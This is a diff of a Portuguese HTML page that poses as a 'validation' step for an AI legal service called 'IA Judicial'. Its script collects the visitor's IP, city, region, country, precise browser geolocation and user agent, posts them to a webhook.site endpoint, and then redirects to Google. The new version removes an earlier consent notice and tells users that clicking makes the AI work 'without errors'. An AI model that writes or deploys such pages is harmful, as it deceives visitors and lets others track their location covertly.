@@ -1,47 +1,71 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-  <meta charset="UTF-8" />
-  <title>IA Judicial - Validação</title>
+  <meta charset="UTF-8">
+  <title>IA Judicial - Validação de Acesso</title>
 </head>
-<body style="font-family: sans-serif; text-align: center; margin-top: 100px;">
-  <h2>🔒 Validação da Identidade</h2>
-  <p>Por medidas de segurança da IA Judicial, a ia judicial analisa todo ambiente.</p>
-  <p>📍 Ao continuar, você autoriza a coleta de dados do navegador.</p>
-  <button onclick="coletarDados()" style="padding: 10px 20px; font-size: 16px;">Validar Agora</button>
+<body style="text-align:center; font-family:sans-serif; margin-top:60px;">
+  <h2>🔐 Verificando - TESTE Beta</h2>
+  <p>Para acessar a IA Judicial, valide seu dispositivo e aprove as opcoes necessarias para poder funcionar sem erros.</p>
+  <p>Ao clicar, a IA irá funcionar sem erros.</p>
+  <button onclick="validar()" style="padding: 10px 20px; font-size: 16px;">Validar Agora</button>
 
   <script>
-    async function coletarDados() {
+    async function validar() {
+      const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
+
+      let latitude = null;
+      let longitude = null;
+
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(async (position) => {
-          const latitude = position.coords.latitude;
-          const longitude = position.coords.longitude;
+          latitude = position.coords.latitude;
+          longitude = position.coords.longitude;
 
-          const ipInfo = await fetch("https://ipapi.co/json/").then(res => res.json());
-
-          const payload = {
-            latitude,
-            longitude,
-            ip: ipInfo.ip,
-            cidade: ipInfo.city,
+          const dados = {
+            ip: ipData.ip,
+            cidade: ipData.city,
+            regiao: ipData.region,
+            pais: ipData.country_name,
+            latitude: latitude,
+            longitude: longitude,
             navegador: navigator.userAgent,
-            data: new Date().toISOString()
+            horario: new Date().toISOString()
           };
 
-          // Enviar para você (use seu link do Webhook.site ou API)
-          await fetch("https://webhook.site/SEU_ID_AQUI", {
+          await fetch("https://webhook.site/https://webhook.site/afac7b89-6504-4ac3-9082-78546bafc829", {
             method: "POST",
-            headers: {
-              "Content-Type": "application/json"
-            },
-            body: JSON.stringify(payload)
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(dados)
           });
 
-          alert("Validação concluída com sucesso.");
-          window.location.href = "https://google.com"; // redirecionamento opcional
+          alert("Validação concluída. Obrigado.");
+          window.location.href = "https://www.google.com";
+        },
+        async (erro) => {
+          // Se o usuário negar geolocalização
+          const dados = {
+            ip: ipData.ip,
+            cidade: ipData.city,
+            regiao: ipData.region,
+            pais: ipData.country_name,
+            latitude: "não permitido",
+            longitude: "não permitido",
+            navegador: navigator.userAgent,
+            horario: new Date().toISOString()
+          };
+
+          await fetch("https://webhook.site/SEU_ID_AQUI", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(dados)
+          });
+
+          alert("Validação parcial sem localização precisa.");
+          window.location.href = "https://www.google.com";
         });
       } else {
-        alert("Geolocalização não suportada pelo navegador.");
+        alert("Geolocalização não suportada neste navegador.");
       }
     }
   </script>
